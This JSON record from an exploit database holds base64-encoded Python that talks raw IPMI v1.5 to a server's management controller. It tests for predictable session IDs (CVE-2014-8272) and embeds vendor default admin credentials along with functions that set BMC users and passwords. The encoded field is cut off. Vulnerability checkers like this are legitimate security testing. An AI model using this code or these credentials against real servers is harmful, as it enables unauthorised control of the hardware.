{
    "source": "exploit-database", 
    "exploit": "IiIiDQpGb3IgdGVzdGluZyBwdXJwb3NlcyBvbmx5Lg0KDQooYykgWW9uZyBDaHVhbiwgS29oIDIwMTQNCiIiIg0KDQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwDQpmcm9tIHNvY2tldCBpbXBvcnQgKg0KZnJvbSBzdHJ1Y3QgaW1wb3J0ICoNCmZyb20gcmFuZG9tIGltcG9ydCAqDQppbXBvcnQgc3lzLCBvcywgYXJncGFyc2UgDQoNCkhPU1QgPSBOb25lDQpQT1JUID0gNjIzDQoNCmJ1ZnNpemUgPSAxMDI0DQpyZWN2ID0gIiINCg0KDQojIGNyZWF0ZSBzb2NrZXQNClVEUHNvY2sgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX0RHUkFNKQ0KVURQc29jay5zZXR0aW1lb3V0KDIpDQoNCmRhdGEgPSAyMQkjb2Zmc2V0IG9mIGRhdGEgc3RhcnQNCg0KUk1DUCA9ICgnXHgwNicgKyAJI1JNQ1AudmVyc2lvbiA9IEFTRiBSTUNQIHYxLjANCgknXHgwMCcgKwkjUk1DUC5yZXNlcnZlZA0KCSdceEZGJyArCSNSTUNQLnNlcQ0KCSdceDA3JwkJI1JNQ1AuVHlwZS9DbGFzcyA9IE5vcm1hbF9STUNQL0lQTUkNCgkpDQoNCg0KDQpkZWYgU2Vzc2lvbkhlYWRlciAoaXBtaSwgYXV0aF90eXBlPSdOb25lJywgc2VxX251bT0wLCBzZXNzX2lkPTAsIHB3ZD1Ob25lKToNCglhdXRoX3R5cGVzID0geydOb25lJzowLCAnTUQyJzoxLCAnTUQ1JzoyLCAnUmVzZXJ2ZWQnOjMsICdTdHJhaWdodCBQd2QnOjQsICdPRU0nOjV9DQoNCglzZXNzX2hlYWRlciA9ICcnDQoJc2Vzc19oZWFkZXIgKz0gcGFjaygnPEInLCBhdXRoX3R5cGVzW2F1dGhfdHlwZV0pDQoJc2Vzc19oZWFkZXIgKz0gcGFjaygnPEwnLCBzZXFfbnVtKQ0KCXNlc3NfaGVhZGVyICs9IHBhY2soJzxMJywgc2Vzc19pZCkNCglpZiBhdXRoX3R5cGUgaXMgbm90ICdOb25lJzoNCgkJcmF3ID0gcHdkICsgcGFjaygnPEwnLCBzZXNzX2lkKSArIGlwbWkgKyBwYWNrKCc8TCcsIHNlcV9udW0pICsgcHdkDQoJCWltcG9ydCBoYXNobGliDQoJCWggPSBoYXNobGliLm1kNShyYXcpDQoJCXNlc3NfaGVhZGVyICs9IGguZGlnZXN0KCkNCglzZXNzX2hlYWRlciArPSBwYWNrKCdCJywgbGVuKGlwbWkpKQ0KCQkJDQoJcmV0dXJuIHNlc3NfaGVhZGVyDQoNCg0KY2xhc3MgQ3JlYXRlSVBNSSAoKToNCglkZWYgX19pbml0X18gKHNlbGYpOg0KCQlzZWxmLnByaXZfbHZscyA9IHsnUmVzZXJ2ZWQnOjAsICdDYWxsYmFjayc6MSwgJ1VzZXInOjIsICdPcGVyYXRvcic6MywgJ0FkbWluJzo0LCAnT0VNJzo1LCAnTk8gQUNDRVNTJzoxNSB9DQoJCXNlbGYucHJpdl9sdmxzXzIgPSB7MDonUmVzZXJ2ZWQnLCAxOidDYWxsYmFjaycsIDI6J1VzZXInLCAzOidPcGVyYXRvcicsIDQ6J0FkbWluJywgNTonT0VNJywgMTU6J05PIEFDQ0VTUyd9DQoJCXNlbGYuYXV0aF90eXBlcyA9IHsnTm9uZSc6MCwgJ01EMic6MSwgJ01ENSc6MiwgJ1Jlc2VydmVkJzozLCAnU3RyYWlnaHQgUHdkJzo0LCAnT0VNJzo1fQ0KDQoJZGVmIENoZWNrU3VtIChzZWxmLCBieXRlcyk6DQoNCgkJY2hrc3VtID0gMA0KCQlxID0gJycNCgkJZm9yIGkgaW4gYnl0ZXM6DQoJCQlxICs9ICclMDJYICcgJW9yZChpKQ0KCQkJY2hrc3VtID0gKGNoa3N1bSArIG9yZChpKSkgJSAweDEwMA0KCQlpZiBjaGtzdW0gPiAwOg0KCQkJY2hrc3VtID0gMHgxMDAgLSBjaGtzdW0NCg0KCQlyZXR1cm4gcGFjaygnPkInLCBjaGtzdW0pDQoNCg0KCWRlZiBIZWFkZXIgKHNlbGYsIGNtZCwgc2VxX251bT0weDAwKToNCgkJI29ubHkgZm9yIElQTUkgdjEuNQ0KCQljbWRzID0geydHZXQgQ2hhbm5lbCBBdXRoIENhcGFiaWxpdGllcycJOiAoMHgwNiwgMHgzOCksICMobmV0Zm4sIGNtZF9jb2RlKQ0KCQkJJ0dldCBTZXNzaW9uIENoYWxsZW5nZScJCTogKDB4MDYsIDB4MzkpLCANCgkJCSdBY3RpdmF0ZSBTZXNzaW9uJwkJOiAoMHgwNiwgMHgzYSksDQoJCQknU2V0IFNlc3Npb24gUHJpdmlsZWdlIExldmVsJwk6ICgweDA2LCAweDNiKSwNCgkJCSdDbG9zZSBTZXNzaW9uJwkJCTogKDB4MDYsIDB4M2MpLA0KCQkJJ1NldCBVc2VyIEFjY2VzcycJCTogKDB4MDYsIDB4NDMpLA0KCQkJJ0dldCBVc2VyIEFjY2VzcycJCTogKDB4MDYsIDB4NDQpLA0KCQkJJ1NldCBVc2VyIE5hbWUnCQkJOiAoMHgwNiwgMHg0NSksDQoJCQknR2V0IFVzZXIgTmFtZScJCQk6ICgweDA2LCAweDQ2KSwNCgkJCSdTZXQgVXNlciBQYXNzd29yZCcJCTogKDB4MDYsIDB4NDcpLA0KCQkJJ0dldCBDaGFzc2lzIFN0YXR1cycJCTogKDB4MDAsIDB4MDEpfQ0KCQlpcG1pX2hlYWRlciA9ICcnDQoJCWlwbWlfaGVhZGVyICs9IHBhY2soJzxCJywgMHgyMCkJCQkjdGFyZ2V0IGFkZHINCgkJaXBtaV9oZWFkZXIgKz0gcGFjaygnPEInLCBjbWRzW2NtZF1bMF08PDIgfCAwKSAJI25ldGZuIHwgdGFyZ2V0IGx1bg0KCQlpcG1pX2hlYWRlciArPSBzZWxmLkNoZWNrU3VtIChpcG1pX2hlYWRlcikNCgkJaXBtaV9oZWFkZXIgKz0gcGFjaygnPEInLCAweDgxKQkJCSNzb3VyY2UgYWRkcg0KCQlpcG1pX2hlYWRlciArPSBwYWNrKCc8QicsIHNlcV9udW08PDIgfCAwKQkjc2VxX251bSB8IHNvdXJjZSBsdW4NCgkJaXBtaV9oZWFkZXIgKz0gcGFjaygnPEInLCBjbWRzW2NtZF1bMV0pCQkjSVBNSSBtZXNzYWdlIGNvbW1hbmQNCg0KCQlyZXR1cm4gaXBtaV9oZWFkZXINCg0KDQoJZGVmIEdldENoYW5uZWxBdXRoZW50aWNhdGlvbkNhcGFiaWxpdGllcyAoc2VsZiwgaGRyX3NlcSwgY2huPTB4MEUsIHByaXZfbHZsPSdBZG1pbicpOg0KCQlpcG1pID0gJycNCgkJaXBtaSArPSBzZWxmLkhlYWRlcignR2V0IENoYW5uZWwgQXV0aCBDYXBhYmlsaXRpZXMnLCBoZHJfc2VxKQ0KCQlpcG1pICs9IHBhY2soJzxCJywgMDw8NyB8IGNobikJCQkjSVBNSSB2MS41IHwgY2huIG51bSAoMC03LCAxND1jdXJyZW50X2NobiwgMTUpDQoJCWlwbWkgKz0gcGFjaygnPEInLCBzZWxmLnByaXZfbHZsc1twcml2X2x2bF0pCSNyZXF1ZXN0ZWQgcHJpdmlsZWdlIGxldmVsDQoJCWlwbWkgKz0gc2VsZi5DaGVja1N1bSAoaXBtaVszOl0pDQoJCQ0KCQlyZXR1cm4gaXBtaQ0KDQoNCglkZWYgR2V0U2Vzc2lvbkNoYWxsZW5nZSAoc2VsZiwgaGRyX3NlcSwgdXNlcm5hbWUsIGF1dGhfdHlwZT0nTUQ1Jyk6DQoJCSNvbmx5IGZvciBJUE1JIHYxLjUNCgkJaXBtaSA9ICcnDQoJCWlwbWkgKz0gc2VsZi5IZWFkZXIoJ0dldCBTZXNzaW9uIENoYWxsZW5nZScsIGhkcl9zZXEpDQoJCWlwbWkgKz0gcGFjaygnPEInLCBzZWxmLmF1dGhfdHlwZXNbYXV0aF90eXBlXSkJI2F1dGhlbnRpY2F0aW9uIHR5cGUNCgkJaXBtaSArPSB1c2VybmFtZQkJCQkjdXNlciBuYW1lDQoJCWlwbWkgKz0gc2VsZi5DaGVja1N1bShpcG1pWzM6XSkNCg0KCQlyZXR1cm4gaXBtaQ0KDQoNCglkZWYgQWN0aXZhdGVTZXNzaW9uIChzZWxmLCBoZHJfc2VxLCBhdXRoY29kZSwgYXV0aF90eXBlPSdNRDUnLCBwcml2X2x2bD0nQWRtaW4nKToNCgkJI29ubHkgZm9yIElQTUkgdjEuNQkNCgkJaXBtaSA9ICcnDQoJCWlwbWkgKz0gc2VsZi5IZWFkZXIoJ0FjdGl2YXRlIFNlc3Npb24nLCBoZHJfc2VxKQ0KCQlpcG1pICs9IHBhY2soJz5CJywgc2VsZi5hdXRoX3R5cGVzW2F1dGhfdHlwZV0pDQoJCWlwbWkgKz0gcGFjaygnPkInLCBzZWxmLnByaXZfbHZsc1twcml2X2x2bF0pDQoJCWlwbWkgKz0gYXV0aGNvZGUJCSNjaGFsbGVuZ2Ugc3RyaW5nDQoJCWlwbWkgKz0gcGFjaygnPEwnLCAweGRlYWRiMGIwKQkjaW5pdGlhbCBvdXRib3VuZCBzZXEgbnVtDQoJCWlwbWkgKz0gc2VsZi5DaGVja1N1bShpcG1pWzM6XSkNCg0KCQlyZXR1cm4gaXBtaQ0KDQoNCglkZWYgU2V0U2Vzc2lvblByaXZpbGVnZUxldmVsIChzZWxmLCBoZHJfc2VxLCBwcml2X2x2bD0nQWRtaW4nKToNCgkJI29ubHkgZm9yIElQTUkgdjEuNQ0KCQlpcG1pID0gJycNCgkJaXBtaSArPSBzZWxmLkhlYWRlcignU2V0IFNlc3Npb24gUHJpdmlsZWdlIExldmVsJywgaGRyX3NlcSkNCgkJaXBtaSArPSBwYWNrKCc+QicsIHNlbGYucHJpdl9sdmxzW3ByaXZfbHZsXSkNCgkJaXBtaSArPSBzZWxmLkNoZWNrU3VtKGlwbWlbMzpdKQ0KDQoJCXJldHVybiBpcG1pDQoNCg0KCWRlZiBDbG9zZVNlc3Npb24gKHNlbGYsIGhkcl9zZXEsIHNlc3NfaWQpOg0KCQlpcG1pID0gJycNCgkJaXBtaSArPSBzZWxmLkhlYWRlciAoIkNsb3NlIFNlc3Npb24iLCBoZHJfc2VxKQ0KCQlpcG1pICs9IHBhY2soJzxMJywgc2Vzc19pZCkNCgkJaXBtaSArPSBzZWxmLkNoZWNrU3VtKGlwbWlbMzpdKQ0KDQoJCXJldHVybiBpcG1pDQoNCg0KCWRlZiBHZXRDaGFzc2lzU3RhdHVzIChzZWxmLCBoZHJfc2VxKToNCgkJaXBtaSA9ICcnDQoJCWlwbWkgKz0gc2VsZi5IZWFkZXIgKCJHZXQgQ2hhc3NpcyBTdGF0dXMiLCBoZHJfc2VxKQ0KCQlpcG1pICs9IHNlbGYuQ2hlY2tTdW0oaXBtaVszOl0pDQoNCgkJcmV0dXJuIGlwbWkNCg0KDQoJZGVmIEdldFVzZXJBY2Nlc3MgKHNlbGYsIGhkcl9zZXEsIHVzZXJfaWQsIGNobl9udW09MHgwRSk6DQoJCWlwbWkgPSAnJw0KCQlpcG1pICs9IHNlbGYuSGVhZGVyICgiR2V0IFVzZXIgQWNjZXNzIiwgaGRyX3NlcSkNCgkJaXBtaSArPSBwYWNrKCc+QicsIGNobl9udW0pCQkjY2huX251bSA9IDB4MEUgPSBjdXJyZW50IGNoYW5uZWwNCgkJaXBtaSArPSBwYWNrKCc+QicsIHVzZXJfaWQpDQoJCWlwbWkgKz0gc2VsZi5DaGVja1N1bShpcG1pWzM6XSkNCg0KCQlyZXR1cm4gaXBtaQ0KDQoNCglkZWYgR2V0VXNlck5hbWUgKHNlbGYsIGhkcl9zZXEsIHVzZXJfaWQ9Mik6DQoJCWlwbWkgPSAnJw0KCQlpcG1pICs9IHNlbGYuSGVhZGVyICgiR2V0IFVzZXIgTmFtZSIsIGhkcl9zZXEpDQoJCWlwbWkgKz0gcGFjaygnPkInLCB1c2VyX2lkKQ0KCQlpcG1pICs9IHNlbGYuQ2hlY2tTdW0oaXBtaVszOl0pDQoNCgkJcmV0dXJuIGlwbWkNCg0KCWRlZiBTZXRVc2VyTmFtZSAoc2VsZiwgaGRyX3NlcSwgdXNlcl9pZCwgdXNlcl9uYW1lKToNCgkJI0Fzc2lnbiB1c2VyX25hbWUgdG8gdXNlcl9pZCwgcmVwbGFjZXMgaWYgdXNlcl9pZCBpcyBvY2N1cGllZA0KCQlpcG1pID0gJycNCgkJaXBtaSArPSBzZWxmLkhlYWRlciAoIlNldCBVc2VyIE5hbWUiLCBoZHJfc2VxKQ0KCQlpcG1pICs9IHBhY2soJz5CJywgdXNlcl9pZCkNCgkJaXBtaSArPSB1c2VyX25hbWUubGp1c3QoMTYsICdceDAwJykNCgkJaXBtaSArPSBzZWxmLkNoZWNrU3VtKGlwbWlbMzpdKQ0KDQoJCXJldHVybiBpcG1pDQoNCglkZWYgU2V0VXNlclBhc3N3b3JkIChzZWxmLCBoZHJfc2VxLCB1c2VyX2lkLCBwYXNzd29yZCwgb3A9J3NldCBwYXNzd29yZCcpOg0KCQlvcHMgPSB7J2Rpc2FibGUgdXNlcic6MCwgJ2VuYWJsZSB1c2VyJzoxLCAnc2V0IHBhc3N3b3JkJzoyLCAndGVzdCBwYXNzd29yZCc6M30NCgkJaXBtaSA9ICcnDQoJCWlwbWkgKz0gc2VsZi5IZWFkZXIgKCJTZXQgVXNlciBQYXNzd29yZCIsIGhkcl9zZXEpDQoJCWlwbWkgKz0gcGFjaygnPkInLCB1c2VyX2lkKQ0KCQlpcG1pICs9IHBhY2soJz5CJywgb3BzW29wXSkNCgkJaXBtaSArPSBwYXNzd29yZC5sanVzdCgxNiwgJ1x4MDAnKSAjSVBNSSB2MS41OiAxNmJ5dGVzIHwgSVBNSSB2Mi4wOiAyMGJ5dGVzDQoJCWlwbWkgKz0gc2VsZi5DaGVja1N1bShpcG1pWzM6XSkNCg0KCQlyZXR1cm4gaXBtaQ0KDQoJZGVmIFNldFVzZXJBY2Nlc3MgKHNlbGYsIGhkcl9zZXEsIHVzZXJfaWQsIG5ld19wcml2LCBjaG49MHgwRSk6DQoJCWlwbWkgPSAnJw0KCQlpcG1pICs9IHNlbGYuSGVhZGVyICgiU2V0IFVzZXIgQWNjZXNzIiwgaGRyX3NlcSkNCgkJaXBtaSArPSBwYWNrKCc8QicsIDE8PDcgfCAwPDw2IHwgMDw8NSB8IDE8PDQgfCBjaG4pCSNiaXQ0PTE9ZW5hYmxlIHVzZXIgZm9yIElQTUkgTWVzc2FnaW5nIHwgY2huPTB4RT1jdXJyZW50IGNoYW5uZWwNCgkJaXBtaSArPSBwYWNrKCc+QicsIHVzZXJfaWQpDQoJCWlwbWkgKz0gcGFjaygnPkInLCBzZWxmLnByaXZfbHZsc1tuZXdfcHJpdl0pDQoJCWlwbWkgKz0gcGFjaygnPkInLCAwKQ0KCQlpcG1pICs9IHNlbGYuQ2hlY2tTdW0oaXBtaVszOl0pDQoNCgkJcmV0dXJuIGlwbWkNCg0KDQpkZWYgU2VuZFVEUCAocGt0KToNCg0KCWdsb2JhbCBIT1NULCBQT1JULCBkYXRhDQoNCglyZXMgPSAnJw0KCWNvZGUgPSBpcG1pX3NlcSA9IDB4RkZGRg0KCWZvciBpIGluIHJhbmdlKDUpOg0KCQl0cnk6DQoJCQlVRFBzb2NrLnNlbmR0byhwa3QsIChIT1NULCBQT1JUKSkNCgkJCXJlcyA9IFVEUHNvY2sucmVjdihidWZzaXplKQ0KCQlleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQoJCQlwcmludCAnWy1dIFNvY2tldCBUaW1lb3V0OiBUcnkgJWQnJWkNCgkJCXNsZWVwICgwKQ0KCQllbHNlOg0KCQkJI2hhdmUgcmVjZWl2ZWQgYSByZXBseQ0KCQkJaWYgcmVzWzQ6NV0gPT0gJ1x4MDInOgkJI1Nlc3Npb24tPkF1dGhUeXBlID0gTUQ1DQoJCQkJZGF0YSArPSAxNg0KCQkJY29kZSAJPSB1bnBhY2soJ0InLHJlc1tkYXRhLTE6ZGF0YV0pWzBdDQoJCQlpcG1pX3NlcT0gdW5wYWNrKCdCJyxyZXNbZGF0YS0zOmRhdGEtMl0pWzBdPj4yDQoJCQlpZiByZXNbNDo1XSA9PSAnXHgwMic6DQoJCQkJZGF0YSAtPSAxNg0KCQkJYnJlYWsNCglyZXR1cm4gY29kZSwgaXBtaV9zZXEsIHJlcw0KDQoNCmRlZiBTZXRVcFNlc3Npb24gKHVzZXJuYW1lLCBwd2QsIHByaXY9J0FkbWluJywgYXV0aD0nTUQ1Jyk6DQoNCglnbG9iYWwgZGF0YQ0KDQoJI0dldCBDaGFubmVsIEF1dGhlbnRpY2F0aW9uIENhcGFiaWxpdGllcw0KCWlwbWkgPSBDcmVhdGVJUE1JKCkuR2V0Q2hhbm5lbEF1dGhlbnRpY2F0aW9uQ2FwYWJpbGl0aWVzKDAsIGNobj0weEUsIHByaXZfbHZsPXByaXYpDQoJY29kZSwgaXBtaV9zZXEsIHJlcyA9IFNlbmRVRFAgKFJNQ1AgKyBTZXNzaW9uSGVhZGVyKGlwbWkpICsgaXBtaSkNCglpZiBjb2RlICE9IDB4MDA6DQoJCXJldHVybiBjb2RlLCAwLCAwLCAwDQoJI3ByaW50ICdbK10lLTMwczogJTAyWCAoJWQpJyUoJ0dldCBDaG4gQXV0aCBDYXBhYmlsaXRpZXMnLCBjb2RlLCBpcG1pX3NlcSkNCg0KDQoJI0dldCBTZXNzaW9uIENoYWxsZW5nZQ0KCWlwbWkgPSBDcmVhdGVJUE1JKCkuR2V0U2Vzc2lvbkNoYWxsZW5nZSgxLCB1c2VybmFtZSwgJ01ENScpDQoJY29kZSwgaXBtaV9zZXEsIHJlcyA9IFNlbmRVRFAgKFJNQ1AgKyBTZXNzaW9uSGVhZGVyKGlwbWkpICsgaXBtaSkNCglpZiBjb2RlICE9IDB4MDA6DQogICAgICAgICAgICAgICAgaWYgY29kZSA9PSAweEZGRkY6DQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAiWy1dIEJNQyBkaWRuJ3QgcmVzcG9uZCB0byBJUE1JIHYxLjUgc2Vzc2lvbiBzZXR1cCINCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICIgICAgSWYgZmlybXdhcmUgaGFkIGRpc2FibGVkIGl0LCB0aGVuIEJNQyBpcyBub3QgdnVsbmVyYWJsZSINCgkJcmV0dXJuIGNvZGUsIDAsIDAsIDANCgl0ZW1wX3Nlc3NfaWQgCT0gdW5wYWNrKCc8TCcsIHJlc1tkYXRhOmRhdGErNF0pWzBdDQoJY2hhbGxlbmdlX3N0ciAJPSByZXNbZGF0YSs0OmRhdGErNCsxNl0NCgkjcHJpbnQgJ1srXSUtMzBzOiAlMDJYICglZCknJSgnR2V0IFNlc3Npb24gQ2hhbGxlbmdlJywgY29kZSwgaXBtaV9zZXEpDQoNCg0KCSNBY3RpdmF0ZSBTZXNzaW9uDQoJaXBtaSA9IENyZWF0ZUlQTUkoKS5BY3RpdmF0ZVNlc3Npb24oMiwgY2hhbGxlbmdlX3N0ciwgYXV0aCwgcHJpdikNCgljb2RlLCBpcG1pX3NlcSwgcmVzID0gU2VuZFVEUCAoUk1DUCArIFNlc3Npb25IZWFkZXIoaXBtaSwgYXV0aCwgMCwgdGVtcF9zZXNzX2lkLCBwd2QpICsgaXBtaSkNCglpZiBjb2RlICE9IDB4MDA6DQoJCXJldHVybiBjb2RlLCAwLCAwLCAwDQoJZGF0YSArPSAxNg0KCXNlc3NfYXV0aF90eXBlIAkJCT0gdW5wYWNrKCdCJywgcmVzW2RhdGE6ZGF0YSsxXSlbMF0NCglzZXNzX2lkIAkJCT0gdW5wYWNrKCc8TCcsIHJlc1tkYXRhKzE6ZGF0YSsxKzRdKVswXQ0KCWluaV9pbmJvdW5kID0gc2Vzc19oZHJfc2VxIAk9IHVucGFjaygnPEwnLCByZXNbZGF0YSs1OmRhdGErNSs0XSlbMF0NCglzZXNzX3ByaXZfbHZsIAkJCT0gdW5wYWNrKCdCJywgcmVzW2RhdGErOTpkYXRhKzkrMV0pWzBdDQoJI3ByaW50ICdbK10lLTMwczogJTAyWCAoJWQpJyUoJ0FjdGl2YXRlIFNlc3Npb24nLCBjb2RlLCBpcG1pX3NlcSkNCgkjcHJpbnQgJyAgICUtMzBzOiBTZXNzaW9uX0lEICUwOFgnJXNlc3NfaWQNCglkYXRhIC09IDE2DQoNCg0KCSNTZXQgU2Vzc2lvbiBQcml2aWxlZ2UgTGV2ZWwNCglpcG1pID0gQ3JlYXRlSVBNSSgpLlNldFNlc3Npb25Qcml2aWxlZ2VMZXZlbCgzLCBwcml2KQ0KCWNvZGUsIGlwbWlfc2VxLCByZXMgPSBTZW5kVURQIChSTUNQICsgU2Vzc2lvbkhlYWRlcihpcG1pLCAnTm9uZScsIHNlc3NfaGRyX3NlcSwgc2Vzc19pZCkgKyBpcG1pKQ0KCXNlc3NfaGRyX3NlcSArPSAxDQoJaWYgY29kZSAhPSAweDAwOg0KCQlyZXR1cm4gY29kZSwgMCwgMCwgMA0KCW5ld19wcml2X2x2bCA9IHVucGFjaygnQicsIHJlc1tkYXRhOmRhdGErMV0pWzBdDQoJI3ByaW50ICdbK10lLTMwczogJTAyWCAoJWQpJyUoJ1NldCBTZXNzaW9uIFByaXYgTGV2ZWwnLCBjb2RlLCBpcG1pX3NlcSkNCg0KDQoJcmV0dXJuIGNvZGUsIHRlbXBfc2Vzc19pZCwgc2Vzc19oZHJfc2VxLCBzZXNzX2lkDQoJDQoNCmRlZiBDbG9zZVNlc3Npb24gKHNlc3Nfc2VxLCBzZXNzX2lkKToNCg0KCWdsb2JhbCBkYXRhDQoNCgkjQ2xvc2UgU2Vzc2lvbg0KCWlwbWkgPSBDcmVhdGVJUE1JKCkuQ2xvc2VTZXNzaW9uKDUsIHNlc3NfaWQpDQoJY29kZSwgaXBtaV9zZXEsIHJlcyA9IFNlbmRVRFAgKFJNQ1AgKyBTZXNzaW9uSGVhZGVyKGlwbWksICdOb25lJywgc2Vzc19zZXEsIHNlc3NfaWQpICsgaXBtaSkNCgkjcHJpbnQgJ1srXSUtMzBzOiAlMDJYICglZCknJSgnQ2xvc2UgU2Vzc2lvbicsIGNvZGUsIGlwbWlfc2VxKQ0KDQoJcmV0dXJuIGNvZGUNCg0KDQpkZWYgQ2hlY2tTZXNzaW9uQWxpdmUoc2Vzc19zZXEsIHNlc3NfaWQpOg0KCSNTZXRVc2VyUGFzc3dvcmQoKTogInVzZXIgZW5hYmxlIDx1c2VyX2lkPiINCglpcG1pID0gQ3JlYXRlSVBNSSgpLkdldENoYXNzaXNTdGF0dXMoMzEpDQoJY29kZSwgaXBtaV9zZXEsIHJlcyA9IFNlbmRVRFAgKFJNQ1AgKyBTZXNzaW9uSGVhZGVyKGlwbWksICdOb25lJywgc2Vzc19zZXEsIHNlc3NfaWQpICsgaXBtaSkNCglwcmludCAnWytdICUtMzVzOiAlMDJYICglZCknJSgnQ2hlY2tTZXNzaW9uQWxpdmUtPkdldENoYXNzaXNTdGF0dXMnLCBjb2RlLCBpcG1pX3NlcSkNCglzZXNzX3NlcSArPSAxDQoJDQoJcmV0dXJuIHNlc3Nfc2VxDQoNCg0KDQoNCg0KZGVmIGJhbm5lcigpOg0KICAgICAgICBwcmludCAoIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIitcDQogICAgICAgICAgICAgICAiIyMgVGhpcyB0b29sIGNoZWNrcyB3aGV0aGVyIGEgQk1DIG1hY2hpbmUgaXMgdnVsbmVyYWJsZSB0byBDVkUtMjAxNC04MjcyXG4iK1wNCiAgICAgICAgICAgICAgICIjIyAoaHR0cDovL3d3dy5rYi5jZXJ0Lm9yZy92dWxzL2lkLzg0MzA0NClcbiIrXA0KICAgICAgICAgICAgICAgIiMjIGJ5IGxvZ2dpbmcgdGhlIFRlbXBvcmFyeVNlc3Npb25JRC9TZXNzaW9uSUQgaW4gZWFjaCBJUE1JIHYxLjUgc2Vzc2lvbixcbiIrXA0KICAgICAgICAgICAgICAgIiMjIGFuZCBjaGVja2luZyB0aGF0IHRoZXNlIHZhbHVlcyBhcmUgaW5jcmVtZW50YWxcbiIrXA0KICAgICAgICAgICAgICAgIiMjIFxuIitcDQogICAgICAgICAgICAgICAiIyMgQXV0aG9yOiAgWW9uZyBDaHVhbiwgS29oXG4iK1wNCiAgICAgICAgICAgICAgICIjIyBFbWFpbDogICB5b25nY2h1YW4ua29oQG13cmluZm9zZWN1cml0eS5jb21cbiIrXA0KICAgICAgICAgICAgICAgIiMjIChjKSBZb25nIENodWFuLCBLb2ggMjAxNFxuIitcDQogICAgICAgICAgICAgICAiIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iKQ0KDQoNCmRlZiBtYWluKCk6DQoNCiAgICAgICAgYmFubmVyKCkNCiAgICAgICAgDQogICAgICAgICNkZWZhdWx0IHVzZXJuYW1lcy9wYXNzd29yZHMgKGh0dHBzOi8vY29tbXVuaXR5LnJhcGlkNy5jb20vY29tbXVuaXR5L21ldGFzcGxvaXQvYmxvZy8yMDEzLzA3LzAyL2EtcGVuZXRyYXRpb24tdGVzdGVycy1ndWlkZS10by1pcG1pKQ0KICAgICAgICB2ZW5kb3JzID0geyJIUCIgICAgICAgICA6eyJ1c2VyIjoiQWRtaW5pc3RyYXRvciIsICAgICAgICJwd2QiOiIifSwgICAgICNubyBkZWZhdWx0IHB3ZDogPGZhY3RvcnkgcmFuZG9taXplZCA4LWNoYXJhY3RlciBzdHJpbmc+DQogICAgICAgICAgICAgICAgICAgIkRFTEwiICAgICAgIDp7InVzZXIiOiJyb290IiwgICAgICAgICAgICAgICAgInB3ZCI6ImNhbHZpbiJ9LA0KICAgICAgICAgICAgICAgICAgICJJQk0iICAgICAgICA6eyJ1c2VyIjoiVVNFUklEIiwgICAgICAgICAgICAgICJwd2QiOiJQQVNTVzBSRCJ9LA0KICAgICAgICAgICAgICAgICAgICJGVUpJVFNVIiAgICA6eyJ1c2VyIjoiYWRtaW4iLCAgICAgICAgICAgICAgICJwd2QiOiJhZG1pbiJ9LA0KICAgICAgICAgICAgICAgICAgICJTVVBFUk1JQ1JPIiA6eyJ1c2VyIjoiQURNSU4iLCAgICAgICAgICAgICAgICJwd2QiOiJBRE1JTiJ9LA0KICAgICAgICAgICAgICAgICAgICJPUkFDTEUiICAgICA6eyJ1c2VyIjoicm9vdCIsICAgICAgICAgICAgICAgICJwd2QiOiJjaGFuZ2VtZSJ9LA0KICAgICAgICAgICAgICAgICAgICJBU1VTIiAgICAgICA6eyJ1c2VyIjoiYWRtaW4iLCAgICAgICAgICAgICAgICJwd2QiOiJhZG1pbiJ9DQogICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgYXJnID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoZGVzY3JpcHRpb249IlRlc3QgZm9yIENWRS0yMDE0LTgyNzI6IFVzZSBvZiBJbnN1ZmZpY2llbnRseSBSYW5kb20gVmFsdWVzIikNCiAgICAgICAgYXJnLmFkZF9hcmd1bWVudCgiLWkiLCAiLS1pcCIsIHJlcXVpcmVkPVRydWUsIGhlbHA9IklQIGFkZHJlc3Mgb2YgQk1DIHNlcnZlciIpDQogICAgICAgIGFyZy5hZGRfYXJndW1lbnQoIi11IiwgIi0tdWRwcG9ydCIsIG5hcmdzPSI/IiwgZGVmYXVsdD02MjMsIHR5cGU9aW50LCBoZWxwPSJQb3J0IG9mIEJNQyBzZXJ2ZXIgKG9wdGlvbmFsOiBkZWZhdWx0IDYyMykiKQ0KICAgICAgICBhcmcuYWRkX2FyZ3VtZW50KCItdiIsICItLXZlbmRvciIsIG5hcmdzPSI/IiwgaGVscD0iU2VydmVyIHZlbmRvciBvZiBCTUMgKG9wdGlvbmFsOiBmb3IgZGVmYXVsdCBCTUMgY3JlZGVudGlhbHMpIikNCiAgICAgICAgYXJnLmFkZF9hcmd1bWVudCgiLW4iLCAiLS11c2VybmFtZSIsIG5hcmdzPSI/IiwgZGVmYXVsdD1Ob25lLCBoZWxwPSJVc2VybmFtZSBvZiBCTUMgYWNjb3VudCAob3B0aW9uYWw6IGZvciBub24tZGVmYXVsdCBjcmVkZW50aWFscykiKQ0KICAgICAgICBhcmcuYWRkX2FyZ3VtZW50KCItcCIsICItLXBhc3N3b3JkIiwgbmFyZ3M9Ij8iLCBkZWZhdWx0PU5vbmUsIGhlbHA9IlBhc3N3b3JkIG9mIEJNQyBhY2NvdW50IChvcHRpb25hbDogZm9yIG5vbi1kZWZhdWx0IGNyZWRlbnRpYWxzKSIpDQoNCiAgICAgICAgYXJncyA9IGFyZy5wYXJzZV9hcmdzKCkNCg0KICAgICAgICBpZiBhcmdzLnZlbmRvciBpcyBub3QgTm9uZTogYXJncy52ZW5kb3IgPSBhcmdzLnZlbmRvci51cHBlcigpDQogICAgICAgIGlmIChhcmdzLnZlbmRvciBpcyBOb25lIG9yIGFyZ3MudmVuZG9yIG5vdCBpbiB2ZW5kb3JzLmtleXMoKSkgYW5kIChhcmdzLnVzZXJuYW1lIGlzIE5vbmUgb3IgYXJncy5wYXNzd29yZCBpcyBOb25lKToNCiAgICAgICAgICAgICAgICBwcmludCAiWy1dIEVycm9yOiAtbiBhbmQgLXAgYXJlIHJlcXVpcmVkIGJlY2F1c2UgLXYgaXMgbm90IHNw